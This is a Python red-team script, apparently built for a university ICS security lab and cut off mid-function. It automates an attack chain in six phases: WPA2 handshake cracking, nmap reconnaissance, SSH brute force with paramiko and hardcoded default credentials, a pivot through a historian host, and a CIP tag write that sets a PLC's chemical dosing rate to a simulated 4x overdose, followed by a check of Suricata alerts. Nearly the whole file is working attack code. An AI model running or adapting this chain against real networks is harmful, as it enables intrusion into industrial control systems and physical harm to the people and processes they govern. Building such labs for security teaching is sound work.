#!/usr/bin/env python3


import subprocess
import sys
import os
import time
import json
import argparse
import socket
from datetime import datetime
from dataclasses import dataclass, field
from typing import Optional


# ── Dependency bootstrap (inside venv) ───────────────────────────────────────
def _require(pkg, import_name=None):
    import importlib
    name = import_name or pkg
    try:
        return importlib.import_module(name)
    except ImportError:
        print(f"[*] Installing {pkg} into venv...")
        subprocess.run([sys.executable, "-m", "pip", "install", pkg, "-q"], check=True)
        return importlib.import_module(name)

_require("rich")
_require("paramiko")
_require("pycomm3")

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.rule import Rule
from rich.prompt import Confirm, Prompt
from rich.progress import Progress
from rich.live import Live
from rich.markup import escape
from rich.text import Text
import paramiko

console = Console()

# ── Static config — edit if your lab topology changes ────────────────────────
CFG = {
    "wifi": {
        "interface":    "wlan0",
        "monitor_iface":"wlan0mon",
        "wordlist":     "/usr/share/wordlists/rockyou.txt",
        "capture_file": "/tmp/incs4810_capture",
    },
    "nmap": {
        "idmz_subnet":  "10.10.10.0/24",
        "ports":        "22,80,443,3000,8086,102,44818",
    },
    "historian": {
        "ip":       "10.10.10.20",
        "port":     22,
        "username": "admin",
        "password": "admin123",
    },
    "honeypot": {
        "ip": "10.10.10.50",   # Cowrie — never target directly
    },
    "plc": {
        "ip":           "10.20.20.100",
        "tag":          "Dosage_Rate",
        "safe_value":   8,
        "attack_value": 32,
    },
    "hydra": {
        "wordlist": "/usr/share/wordlists/rockyou.txt",
        "threads":  4,
    },
}

# ── Result tracking ───────────────────────────────────────────────────────────
@dataclass
class PhaseResult:
    phase:   str
    status:  str = "pending"   # pending | success | failed | skipped
    output:  str = ""
    finding: str = ""
    ts:      str = field(default_factory=lambda: datetime.now().isoformat())


results: list[PhaseResult] = []

# ── UI helpers ────────────────────────────────────────────────────────────────

ASCII_BANNER = (
    "██╗  ██╗███████╗███╗   ███╗ ██████╗      ██╗      ██████╗  ██████╗██╗  ██╗\n"
    "██║  ██║██╔════╝████╗ ████║██╔═══██╗     ██║     ██╔═══██╗██╔════╝██║ ██╔╝\n"
    "███████║█████╗  ██╔████╔██║██║   ██║     ██║     ██║   ██║██║     █████╔╝ \n"
    "██╔══██║██╔══╝  ██║╚██╔╝██║██║   ██║     ██║     ██║   ██║██║     ██╔═██╗ \n"
    "██║  ██║███████╗██║ ╚═╝ ██║╚██████╔╝     ███████╗╚██████╔╝╚██████╗██║  ██╗\n"
    "╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝      ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝\n"
    "\n"
    "      █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗                    \n"
    "     ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝                    \n"
    "     ███████║   ██║      ██║   ███████║██║     █████╔╝                     \n"
    "     ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗                     \n"
    "     ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗                    \n"
    "     ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ V1                 \n"
)

def banner():
    console.print(f"[bold red]{ASCII_BANNER}[/bold red]")
    console.print(Panel(
        "[bold white]INCS 4810 — Red Team Attack Chain[/bold white]  "
        "[dim]|  BCIT SW01-3550  |  ISA/IEC 62443[/dim]\n"
        "[dim]Instructor: Victor Mendez  |  BCIT SW01-3550[/dim]\n"
        "[bold yellow]All actions are authorized and confined to the isolated lab network.[/bold yellow]",
        border_style="red",
        expand=False,
    ))


def phase_header(n: int, title: str):
    console.print()
    console.rule(f"[bold cyan]Phase {n}: {title}[/bold cyan]")


def ok(msg: str):
    console.print(f"[bold green] [+][/bold green] [green]{msg}[/green]")


def warn(msg: str):
    console.print(f"[bold yellow] [!][/bold yellow] [yellow]{msg}[/yellow]")


def err(msg: str):
    console.print(f"[bold red] [-][/bold red] [red]{msg}[/red]")


def info(msg: str):
    console.print(f"[bold blue] [*][/bold blue] [blue]{msg}[/blue]")


def run_cmd(cmd: str, timeout: int = 120, capture: bool = True) -> tuple[int, str]:
    """Run a shell command silently, return (returncode, stdout+stderr)."""
    console.print(f"[dim]$ {escape(cmd)}[/dim]")
    try:
        proc = subprocess.run(
            cmd, shell=True, timeout=timeout,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True
        )
        if capture:
            console.print(f"[dim]{escape(proc.stdout[-2000:])}[/dim]")
        return proc.returncode, proc.stdout
    except subprocess.TimeoutExpired:
        return -1, "TIMEOUT"


def stream_cmd(
    cmd: str,
    timeout: int = 300,
    line_filter=None,
    stop_sentinel: str | None = None,
) -> tuple[int, str]:
    """
    Stream a command's output line-by-line with live display.
    line_filter(line) -> rich markup string, or None to use dim default.
    stop_sentinel: kill the process immediately if this string appears in a line
    (used for hydra -f workaround so we don't wait for the process to flush).
    """
    console.print(f"[dim]$ {escape(cmd)}[/dim]")
    lines: list[str] = []
    start = time.monotonic()

    proc = subprocess.Popen(
        cmd, shell=True,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1,
    )

    try:
        for raw in proc.stdout:
            line = raw.rstrip()
            if not line:
                continue
            lines.append(line)
            styled = line_filter(line) if line_filter else f"[dim]{escape(line)}[/dim]"
            console.print(styled)
            if stop_sentinel and stop_sentinel in line:
                proc.terminate()
                break
    except Exception:
        pass
    finally:
        proc.wait()

    elapsed = time.monotonic() - start
    info(f"Finished in {elapsed:.1f}s  (exit {proc.returncode})")
    return proc.returncode, "\n".join(lines)


def _nmap_filter(line: str) -> str:
    lo = line.lower()
    if "nmap scan report" in lo:
        return f"[bold cyan]{escape(line)}[/bold cyan]"
    if "/tcp" in lo and "open" in lo:
        return f"[green]{escape(line)}[/green]"
    if "host is up" in lo:
        return f"[dim green]{escape(line)}[/dim green]"
    return f"[dim]{escape(line)}[/dim]"




def ssh_connect(hostname: str, username: str, password: str, port: int = 22) -> paramiko.SSHClient:
    """Open and return an authenticated SSHClient. Raises on failure."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        hostname=hostname,
        port=port,
        username=username,
        password=password,
        timeout=15,
    )
    ok(f"SSH connected  {username}@{hostname}:{port}")
    return client


def ssh_run(client: paramiko.SSHClient, cmd: str, timeout: int = 30) -> tuple[str, str, int]:
    """Execute a command on an open SSHClient, return (stdout, stderr, exit_code)."""
    info(f"remote $ {escape(cmd)}")
    _, stdout_ch, stderr_ch = client.exec_command(cmd, timeout=timeout)
    stdout    = stdout_ch.read().decode()
    stderr    = stderr_ch.read().decode()
    exit_code = stdout_ch.channel.recv_exit_status()
    if stdout.strip():
        console.print(f"[dim]{escape(stdout.strip())}[/dim]")
    if stderr.strip():
        console.print(f"[dim red]{escape(stderr.strip())}[/dim red]")
    return stdout, stderr, exit_code


def confirm_phase(title: str) -> bool:
    console.print()  # blank line so prompt never lands mid-output
    return Confirm.ask(f"[yellow]Run[/yellow] [bold]{title}[/bold]?", default=True)


def _resolve_wordlist(path: str) -> str | None:
    """
    Find rockyou.txt — handle gzipped version on stock Kali,
    and fall back to common alternate locations.
    """
    candidates = [
        path,
        path + ".gz",
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/rockyou.txt.gz",
        "/opt/wordlists/rockyou.txt",
        os.path.expanduser("~/rockyou.txt"),
    ]
    for p in candidates:
        if os.path.exists(p):
            if p.endswith(".gz"):
                extracted = p[:-3]
                if not os.path.exists(extracted):
                    info(f"Extracting {p} ...")
                    run_cmd(f"sudo gunzip -k {p}", capture=False)
                return extracted if os.path.exists(extracted) else None
            return p
    return None


def _find_gateway() -> str | None:
    """Return the default gateway IP from the routing table."""
    rc, out = run_cmd("ip route show default", capture=False)
    for line in out.splitlines():
        parts = line.split()
        if "default" in parts and "via" in parts:
            return parts[parts.index("via") + 1]
    return None


def _inject_route(subnet: str, via: str):
    """Add a host route silently; ignore error if it already exists."""
    run_cmd(f"sudo ip route add {subnet} via {via} 2>/dev/null || true", capture=False)


def _probe_gateway_for_subnets(gateway: str) -> list[str]:
    """
    Send a quick nmap ping sweep through the gateway to discover
    which subnets are reachable, then infer /24 networks from live hosts.
    Works by doing a broad sweep of RFC-1918 space that the gateway routes.
    """
    info(f"Probing gateway {gateway} for reachable subnets...")
    # Sweep private ranges quickly — hosts that reply must be routable via gw
    sweep_targets = "10.0.0.0/8 172.16.0.0/12 192.168.0.0/16"
    rc, out = run_cmd(
        f"sudo nmap -T4 -n --open -sn --send-eth "
        f"--script='' {sweep_targets} 2>/dev/null | grep 'Nmap scan report'",
        timeout=20, capture=False
    )
    found: set[str] = set()
    for line in out.splitlines():
        # "Nmap scan report for 10.10.10.20" → extract /24
        parts = line.strip().split()
        if parts:
            ip = parts[-1].strip("()")
            segments = ip.split(".")
            if len(segments) == 4:
                net = ".".join(segments[:3]) + ".0/24"
                found.add(net)
    return list(found)


def _accept_icmp_redirects():
    """Allow the kernel to follow ICMP redirects and update its routing table."""
    run_cmd("sudo sysctl -w net.ipv4.conf.all.accept_redirects=1 >/dev/null 2>&1", capture=False)
    run_cmd("sudo sysctl -w net.ipv4.conf.all.secure_redirects=1 >/dev/null 2>&1", capture=False)
    run_cmd("sudo sysctl -w net.ipv4.conf.default.accept_redirects=1 >/dev/null 2>&1", capture=False)


def _extract_redirect_hop(target_ip: str) -> str | None:
    """
    Ping a host and extract the ICMP redirect next-hop if one is returned.
    Returns the suggested gateway IP, or None if no redirect seen.
    """
    _, out = run_cmd(f"ping -c 2 -W 1 {target_ip} 2>&1", capture=False)
    for line in out.splitlines():
        if "Redirect" in line and "nexthop" in line.lower():
            # "From x.x.x.x ... Redirect Network(New nexthop: y.y.y.y)"
            try:
                return line.split("nexthop:")[-1].strip().rstrip(")")
            except Exception:
                pass
    return None


def auto_route(subnets: list[str]):
    """
    Automatically inject routes to target subnets.
    Accepts ICMP redirects so the kernel follows switch/router hints,
    then re-routes through the redirect-suggested hop if ping still fails.
    """
    # Step 1: allow kernel to accept ICMP redirects (disabled by default on Kali)
    _accept_icmp_redirects()

    gw = _find_gateway()
    if not gw:
        warn("Could not determine default gateway — routes may be missing")
        return

    info(f"Default gateway: {gw}")

    # Map each subnet to a real host IP to ping — network IDs (.0) don't respond
    SUBNET_PING_HOST = {
        CFG["nmap"]["idmz_subnet"]: CFG["historian"]["ip"],
        "10.20.20.0/24":            CFG["plc"]["ip"],
    }

    target_subnets = list(set(subnets + _probe_gateway_for_subnets(gw)))

    for subnet in target_subnets:
        # Use a real host for reachability checks, not the network address
        ping_host = SUBNET_PING_HOST.get(subnet, subnet.split("/")[0])

        _inject_route(subnet, gw)

        _, ping_out = run_cmd(f"ping -c 2 -W 1 {ping_host} 2>&1", capture=False)
        reachable = "bytes from" in ping_out

        if not reachable:
            redirect_hop = _extract_redirect_hop(ping_host)
            if redirect_hop and redirect_hop != gw:
                info(f"ICMP redirect detected — re-routing {subnet} via {redirect_hop}")
                run_cmd(f"sudo ip route del {subnet} 2>/dev/null || true", capture=False)
                _inject_route(subnet, redirect_hop)
                _, ping2 = run_cmd(f"ping -c 2 -W 1 {ping_host} 2>&1", capture=False)
                if "bytes from" in ping2:
                    ok(f"Route OK: {subnet} via {redirect_hop} (ping {ping_host})")
                else:
                    warn(f"{subnet} still unreachable via {redirect_hop} — may be FortiGate policy")
            else:
                warn(f"{subnet} unreachable — no redirect hint found (check FortiGate policy)")
        else:
            ok(f"Route OK: {subnet} via {gw} (ping {ping_host})")


def preflight_check():
    """Verify required system tools are installed before running any phase."""
    tools = ["nmap", "aircrack-ng", "airodump-ng", "aireplay-ng", "airmon-ng"]
    missing = []
    for tool in tools:
        rc, _ = run_cmd(f"which {tool}", capture=False)
        if rc != 0:
            missing.append(tool)
    if missing:
        err(f"Missing tools: {', '.join(missing)}")
        err("Install with: sudo apt-get install -y nmap aircrack-ng")
        sys.exit(1)
    ok(f"Preflight OK — all tools found: {', '.join(tools)}")

    # Auto-inject routes to known target subnets so scans reach IDMZ/OT
    auto_route([
        CFG["nmap"]["idmz_subnet"],
        "10.20.20.0/24",
    ])


# ── Phase implementations ─────────────────────────────────────────────────────

def phase1_wifi_crack() -> PhaseResult:
    phase_header(1, "WiFi AP Crack (WPA2 Handshake)")
    r = PhaseResult("WiFi Crack")

    bssid   = Prompt.ask("  Enter AP BSSID  (e.g. AA:BB:CC:DD:EE:FF)")
    channel = Prompt.ask("  Enter AP channel (e.g. 6)")
    cap     = CFG["wifi"]["capture_file"]
    iface   = CFG["wifi"]["interface"]
    mon     = CFG["wifi"]["monitor_iface"]
    wl      = CFG["wifi"]["wordlist"]

    ok("Starting monitor mode...")
    run_cmd("airmon-ng check kill")
    run_cmd(f"airmon-ng start {iface}")

    ok(f"Capturing handshake on ch {channel} (60 s)...")
    warn(f"Run in a second terminal: aireplay-ng --deauth 10 -a {bssid} {mon}")
    run_cmd(
        f"timeout 60 airodump-ng --bssid {bssid} -c {channel} -w {cap} {mon}",
        timeout=75
    )

    ok("Cracking handshake with aircrack-ng...")
    rc, out = run_cmd(f"aircrack-ng {cap}-01.cap -w {wl}", timeout=300)

    if "KEY FOUND" in out:
        key_lines = [l for l in out.splitlines() if "KEY FOUND" in l]
        r.finding = key_lines[0] if key_lines else "KEY FOUND"
        r.status  = "success"
        ok(r.finding)
    else:
        r.status  = "failed"
        r.finding = "Handshake not cracked (try larger wordlist)"
        err(r.finding)

    r.output = out[-1000:]
    return r


def phase2_idmz_recon() -> PhaseResult:
    phase_header(2, "IDMZ Recon (nmap)")
    r = PhaseResult("IDMZ Recon")

    subnet = CFG["nmap"]["idmz_subnet"]
    ports  = CFG["nmap"]["ports"]

    # Target the Historian directly — scanning the whole /24 lets FortiGate drop
    # the flood. -Pn skips ping discovery (FortiGate blocks ICMP too).
    # No --min-rate to avoid triggering rate-limit rules on the firewall.
    # No --open so filtered ports are visible (confirms FortiGate is there).
    target_ip = CFG["historian"]["ip"]
    nmap_cmd = (
        f"sudo nmap -T4 -n -sS -Pn -sV --version-intensity 0 "
        f"-p {ports} {target_ip}"
    )
    info(f"Targeting {target_ip} directly (FortiGate-safe, -Pn, no rate floor)")
    rc, out = stream_cmd(nmap_cmd, timeout=60, line_filter=_nmap_filter)

    historian_found = CFG["historian"]["ip"] in out
    honeypot_found  = CFG["honeypot"]["ip"]  in out

    if historian_found:
        ok(f"Historian found at {CFG['historian']['ip']}")
        r.finding = f"Historian ({CFG['historian']['ip']}) reachable"
        r.status  = "success"
    else:
        warn("Historian not found in scan output — check connectivity")
        r.status  = "failed"
        r.finding = "Historian not reachable"

    if honeypot_found:
        warn(f"[TRAP] Cowrie honeypot at {CFG['honeypot']['ip']} — DO NOT target this host")

    r.output = out[-2000:]
    return r


def _tcp_reachable(ip: str, port: int, timeout: float = 1.0) -> bool:
    """Quick socket test — returns True if TCP port is open and accepting."""
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


BRUTE_BANNER = """\
  ___ ___ ___ _   _ _____ ___   ___ ___  ___ ___ ___
 | _ ) _ \\ | | | |_   _| __| | __/ _ \\| _ \\ __/ __|
 | _ \\   / |_| |   | | | _|  | _| (_) |   / _|\\__ \\
 |___/_|_\\\\___/    |_| |___| |_|_\\___/|_|_\\___|___/

     ___    _   ___ _  __     _    ___  _  _____ ___
    / __|  /_\\ / __| |/ /    /_\\  |   \\| ||_ _| _ \\\ 
   | (__  / _ \\ (__| ' <    / _ \\ | |) | |__| ||   /
    \\___/_/ \\_ \\___|_|\\_\\  /_/ \\_\\|___/|____|___|_|_\\
"""

LOCK_ART = """\
        +-----+
        |     |
        | OT  |
        |HIST |
     +--+-----+--+
     |  LOCKED   |
     |  TARGET   |
     +-----------+
"""


def _ssh_bruteforce(
    ip: str,
    port: int,
    username: str,
    wordlist_path: str,
    delay: float = 0.2,
) -> str | None:
    """
    Sequential paramiko SSH brute forcer with rich Progress bar.
    - AuthenticationException  → wrong password, skip
    - SSHException              → possible rate-limit, wait 1s and retry same password
    - timeout / connection err  → abort after 3 consecutive failures
    """
    priority = ["", username, username[::-1], f"{username}123", "password", "admin123"]

    try:
        with open(wordlist_path, errors="ignore") as f:
            wordlist = [line.strip() for line in f if line.strip()]
    except (FileNotFoundError, OSError):
        wordlist = []

    candidates = list(dict.fromkeys(priority + wordlist))  # ordered dedup
    total = len(candidates)
    MAX_CONSECUTIVE_TIMEOUTS = 3

    consecutive_timeouts = 0
    found_password: str | None = None

    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TaskProgressColumn, TimeElapsedColumn

    with Progress(
        SpinnerColumn(),
        TextColumn("[bold cyan]{task.description}"),
        BarColumn(bar_width=28),
        TaskProgressColumn(),
        TimeElapsedColumn(),
        console=console,
        transient=False,
    ) as progress:
        task = progress.add_task(
            f"Attempting {username}@{ip}", total=total
        )

        for pw in candidates:
            if progress.finished:
                break

            progress.update(
                task,
                description=f"[bold cyan]Attempting: {username}@{ip}  password: {pw}[/bold cyan]",
            )

            retry = True
            while retry:
                retry = False
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(
                        hostname=ip,
                        username=username,
                        password=pw,
                        timeout=3,
                        allow_agent=False,
                        look_for_keys=False,
                        banner_timeout=3,
                    )
                    client.close()
                    consecutive_timeouts = 0
                    found_password = pw
                    progress.update(task, completed=total,
                                    description=f"[bold green]FOUND: {username}@{ip}  password: {pw}[/bold green]")
                    break  # exit while

                except paramiko.AuthenticationException:
                    # Wrong password — clean rejection, move on
                    consecutive_timeouts = 0
                    time.sleep(delay)

                except paramiko.SSHException:
                    # Possible rate-limit on Historian — wait 1s and retry same pw
                    progress.update(task,
                        description=f"[yellow]SSHException (rate-limit?) — retrying {pw} in 1s[/yellow]")
                    time.sleep(1)
                    retry = True

                except (socket.timeout, paramiko.ssh_exception.NoValidConnectionsError, OSError):
                    consecutive_timeouts += 1
                    progress.update(task,
                        description=f"[yellow]Timeout {consecutive_timeouts}/{MAX_CONSECUTIVE_TIMEOUTS} on {ip}:{port}[/yellow]")
                    if consecutive_timeouts >= MAX_CONSECUTIVE_TIMEOUTS:
                        progress.update(task,
                            description=f"[red]Network blocked — aborting[/red]")
                        return None
                    time.sleep(1)

            if found_password is not None:
                break
            progress.advance(task)

    return found_password


def phase3_ssh_bruteforce() -> PhaseResult:
    phase_header(3, "SSH Brute Force on Historian (paramiko)")
    r = PhaseResult("SSH Brute Force")

    console.print(f"[cyan]{LOCK_ART}[/cyan]")
    console.print(f"[bold red]{BRUTE_BANNER}[/bold red]")

    ip   = CFG["historian"]["ip"]
    port = CFG["historian"]["port"]
    user = CFG["historian"]["username"]
    wl   = _resolve_wordlist(CFG["hydra"]["wordlist"])

    info(f"Target: {user}@{ip}:{port}")

    # ── Fail-fast: abort if Phase 2 marked host down ───────────────────────────
    last_phase2 = next(
        (res for res in reversed(results) if res.phase == "IDMZ Recon"), None
    )
    if last_phase2 and last_phase2.status == "failed":
        r.status  = "failed"
        r.finding = f"Target unreachable — Phase 2 reported {ip} as down, skipping"
        err(r.finding)
        return r

    # ── Fail-fast: 1-second TCP socket probe ──────────────────────────────────
    info(f"TCP probe → {user}@{ip}:{port} ...")
    if not _tcp_reachable(ip=ip, port=port, timeout=1.0):
        r.status  = "failed"
        r.finding = f"Target unreachable — {ip}:{port} timed out (FortiGate may be blocking)"
        err(r.finding)
        return r
    ok(f"Port {port} open on {ip} — starting brute force")

    if not wl:
        warn("rockyou.txt not found — running priority-list only")
        wl = "/dev/null"
    else:
        info(f"Wordlist: {wl}")

    found_pw = _ssh_bruteforce(ip=ip, port=port, username=user, wordlist_path=wl)

    if found_pw is not None:
        # ── ACCESS GRANTED panel ───────────────────────────────────────────────
        console.clear()
        console.print(Panel(
            f"\n[bold white]  ACCESS GRANTED  \n\n"
            f"  User  : [bold yellow]{user}[/bold yellow]\n"
            f"  Host  : [bold yellow]{ip}:{port}[/bold yellow]\n"
            f"  Pass  : [bold yellow]{found_pw}[/bold yellow]\n",
            title="[bold white] SSH COMPROMISED [/bold white]",
            border_style="bold green",
            expand=False,
            padding=(1, 4),
        ))
        r.status  = "success"
        r.finding = f"Credentials confirmed: {user}:{found_pw}"
        CFG["historian"]["password"] = found_pw
    else:
        r.status  = "failed"
        r.finding = f"No valid password found for {user}@{ip}"
        err(r.finding)

    r.output = r.finding
    return r


def phase4_ssh_pivot() -> PhaseResult:
    phase_header(4, "SSH into Historian — Lateral Movement Recon")
    r = PhaseResult("SSH Pivot / OT Recon")

    ip       = CFG["historian"]["ip"]
    username = CFG["historian"]["username"]
    password = CFG["historian"]["password"]
    port     = CFG["historian"]["port"]

    try:
        client = ssh_connect(hostname=ip, username=username, password=password, port=port)

        plc_ip   = CFG["plc"]["ip"]
        findings = []
        checks   = {"route": False, "ping": False, "syslog": False}

        # ── 1. OT syslog ────────────────────────────────────────────────────
        console.print("\n[bold cyan]OT syslog (last 20 lines)[/bold cyan]")
        syslog_out, _, syslog_rc = ssh_run(client, "grep '10.20.20' /var/log/syslog | tail -20")
        if syslog_out.strip():
            checks["syslog"] = True
            ok("OT zone syslog entries present")
        else:
            warn("No OT syslog entries found — rsyslog forwarding may not be running")
        findings.append(f"Syslog:\n{syslog_out}")

        # ── 2. Route to OT zone ─────────────────────────────────────────────
        console.print("\n[bold cyan]Route to OT zone[/bold cyan]")
        route_out, _, route_rc = ssh_run(client, f"ip route get {plc_ip}")
        if route_rc == 0 and plc_ip in route_out:
            checks["route"] = True
            ok(f"Route to {plc_ip} exists")
        else:
            err(f"No route to {plc_ip} — OT zone may not be reachable from Historian")
        findings.append(f"Route:\n{route_out}")

        # ── 3. Ping PLC — parse ICMP replies, not just exit code ────────────
        console.print("\n[bold cyan]Ping PLC[/bold cyan]")
        ping_out, _, ping_rc = ssh_run(client, f"ping -c 4 -W 2 {plc_ip}")
        # Only trust it if we see actual ICMP echo replies in the output
        icmp_replies = [l for l in ping_out.splitlines() if "bytes from" in l]
        if icmp_replies:
            checks["ping"] = True
            ok(f"PLC {plc_ip} is alive — {len(icmp_replies)} ICMP replies received")
            for rep in icmp_replies:
                console.print(f"  [green]{escape(rep.strip())}[/green]")
        else:
            err(f"PLC {plc_ip} did NOT respond to ping")
            if "100% packet loss" in ping_out:
                err("100% packet loss — host is unreachable or firewalled")
            elif "Network unreachable" in ping_out or "No route" in ping_out:
                err("Network unreachable — no route exists to OT zone")
            else:
                warn(f"Ping output was ambiguous:\n{ping_out[:300]}")
        findings.append(f"Ping:\n{ping_out}")

        client.close()

        # ── Determine overall phase result ───────────────────────────────────
        if checks["route"] and checks["ping"]:
            r.status  = "success"
            r.finding = f"OT zone confirmed reachable — route + ICMP verified to {plc_ip}"
            ok(r.finding)
        elif checks["route"] and not checks["ping"]:
            r.status  = "failed"
            r.finding = f"Route to {plc_ip} exists but host does not respond (down or firewalled)"
            err(r.finding)
        elif not checks["route"]:
            r.status  = "failed"
            r.finding = f"No route from Historian to OT zone ({plc_ip}) — pivot blocked"
            err(r.finding)

        r.output = "\n".join(findings)

    except paramiko.AuthenticationException:
        r.status  = "failed"
        r.finding = f"SSH auth failed for {username}@{ip} — update CFG credentials"
        err(r.finding)
    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))

    return r


def phase5_plc_attack() -> PhaseResult:
    phase_header(5, "CIP Write Tag — PLC Dosage_Rate Manipulation")
    r = PhaseResult("PLC CIP Write")

    plc_ip   = CFG["plc"]["ip"]
    tag      = CFG["plc"]["tag"]
    safe_val = CFG["plc"]["safe_value"]
    atk_val  = CFG["plc"]["attack_value"]

    hist_ip       = CFG["historian"]["ip"]
    hist_port     = CFG["historian"]["port"]
    hist_username = CFG["historian"]["username"]
    hist_password = CFG["historian"]["password"]

    warn(f"This will write {tag} = {atk_val} (simulated 4x overdose) on PLC {plc_ip}")
    warn("MasterFlex pump will physically change behavior.")

    if not Confirm.ask("[red]Confirm attack write?[/red]", default=False):
        r.status  = "skipped"
        r.finding = "Skipped by operator"
        return r

    # Payload runs on Historian so CIP traffic originates from 10.10.10.20.
    # Try common venv paths; fall back to system python3 if none found.
    # bash -c wrapper lets us chain source + heredoc in a single exec_command.
    payload = (
        "bash -c '"
        "source ~/attack_script/venv/bin/activate 2>/dev/null || "
        "source ~/venv/bin/activate 2>/dev/null || "
        "source ~/main/venv/bin/activate 2>/dev/null || true; "
        f"python3 - <<'\"'\"'PYEOF'\"'\"'\n"
        f"from pycomm3 import LogixDriver\n"
        f"with LogixDriver(\"{plc_ip}\") as plc:\n"
        f"    cur = plc.read(\"{tag}\")\n"
        f"    print(\"Before:\", cur.value)\n"
        f"    plc.write((\"{tag}\", {atk_val}))\n"
        f"    after = plc.read(\"{tag}\")\n"
        f"    print(\"After:\", after.value)\n"
        "PYEOF\n'"
    )

    try:
        client = ssh_connect(
            hostname=hist_ip,
            username=hist_username,
            password=hist_password,
            port=hist_port,
        )
        ok(f"Sending CIP Write via Historian ({hist_ip}) → PLC ({plc_ip})")
        stdout, stderr, _ = ssh_run(client, payload, timeout=30)
        client.close()

        if f"After: {atk_val}" in stdout:
            r.status  = "success"
            r.finding = f"{tag} written: {safe_val} → {atk_val} (4x overdose simulated)"
            ok(r.finding)
        elif "Error" in stderr or "Traceback" in stderr:
            r.status  = "failed"
            r.finding = stderr[:300]
            err(r.finding)
        else:
            r.status  = "success"
            r.finding = f"CIP Write sent — verify tag value on PLC / Grafana"
            warn(r.finding)

        r.output = stdout + stderr

    except paramiko.AuthenticationException:
        r.status  = "failed"
        r.finding = f"SSH auth failed for {hist_username}@{hist_ip}"
        err(r.finding)
    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))

    return r


def phase6_defense_check() -> PhaseResult:
    phase_header(6, "Defense Validation (Secure State)")
    r = PhaseResult("Defense Validation")

    ids_ip       = "10.20.20.5"
    ids_username = CFG["historian"]["username"]
    ids_password = CFG["historian"]["password"]
    ids_port     = CFG["historian"]["port"]
    ids_cmd      = "tail -50 /var/log/suricata/fast.log | grep -i 'cip\\|write\\|plc'"

    info(f"Checking Suricata alerts on IDS ({ids_ip})...")

    try:
        client = ssh_connect(
            hostname=ids_ip,
            username=ids_username,
            password=ids_password,
            port=ids_port,
        )
        stdout, _, _ = ssh_run(client, ids_cmd)
        client.close()

        if stdout.strip():
            ok("Suricata CIP alert triggered:")
            console.print(f"[yellow]{escape(stdout)}[/yellow]")
            r.finding = "Suricata blocked CIP Write — Layer 1 defense confirmed"
            r.status  = "success"
        else:
            warn("No Suricata CIP alerts found — check rule deployment")
            r.finding = "No Suricata alerts detected"
            r.status  = "success"

        r.output = stdout

    except paramiko.AuthenticationException:
        r.status  = "failed"
        r.finding = f"SSH auth failed for {ids_username}@{ids_ip}"
        err(r.finding)
    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))

    return r


# ── Final report ──────────────────────────────────────────────────────────────

def print_report():
    console.print()
    console.rule("[bold white]Attack Chain Report[/bold white]")

    STATUS_STYLE = {
        "success": ("green",  " SUCCESS"),
        "failed":  ("red",    " FAILED "),
        "skipped": ("yellow", " SKIPPED"),
        "pending": ("dim",    " PENDING"),
    }

    table = Table(show_header=True, header_style="bold magenta", border_style="dim")
    table.add_column("#",       style="dim",   width=3)
    table.add_column("Phase",   style="cyan",  width=26)
    table.add_column("Status",  width=10)
    table.add_column("Finding", width=54)

    for i, r in enumerate(results, 1):
        color, label = STATUS_STYLE.get(r.status, ("white", r.status.upper()))
        table.add_row(
            str(i),
            r.phase,
            f"[bold {color}]{label}[/bold {color}]",
            r.finding,
        )

    console.print(table)

    report_path = f"/tmp/incs4810_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    data = [
        {"phase": r.phase, "status": r.status,
         "finding": r.finding, "ts": r.ts, "output": r.output}
        for r in results
    ]
    with open(report_path, "w") as f:
        json.dump(data, f, indent=2)

    ok(f"Full JSON report saved: {report_path}")


# ── Phase registry ────────────────────────────────────────────────────────────

PHASES = [
    (1, "WiFi AP Crack",         phase1_wifi_crack),
    (2, "IDMZ Recon",            phase2_idmz_recon),
    (3, "SSH Brute Force",       phase3_ssh_bruteforce),
    (4, "SSH Pivot / OT Recon",  phase4_ssh_pivot),
    (5, "PLC CIP Write Attack",  phase5_plc_attack),
    (6, "Defense Validation",    phase6_defense_check),
]


# ── Entry point ───────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="INCS 4810 Red Team Chain — BCIT Authorized Lab"
    )
    parser.add_argument(
        "--phases", nargs="*", type=int,
        help="Run specific phases only, e.g. --phases 2 3 4"
    )
    parser.add_argument(
        "--auto", action="store_true",
        help="Skip per-phase confirmation prompts"
    )
    args = parser.parse_args()

    banner()
    preflight_check()

    selected   = set(args.phases) if args.phases else {n for n, _, _ in PHASES}
    chain_start = time.monotonic()

    for n, title, fn in PHASES:
        if n not in selected:
            results.append(PhaseResult(title, status="skipped", finding="Not selected"))
            continue

        if not args.auto and not confirm_phase(f"Phase {n}/{len(PHASES)}: {title}"):
            results.append(PhaseResult(title, status="skipped", finding="Skipped by operator"))
            continue

        phase_start = time.monotonic()
        r = fn()
        phase_elapsed = time.monotonic() - phase_start
        results.append(r)

        # Per-phase elapsed time — always shown, no fake progress bar
        status_color = "green" if r.status == "success" else "red" if r.status == "failed" else "yellow"
        console.print(
            f"\n[dim]Phase {n} complete — "
            f"[{status_color}]{r.status.upper()}[/{status_color}]  "
            f"elapsed [bold]{phase_elapsed:.1f}s[/bold][/dim]"
        )

        if r.status == "failed" and not args.auto:
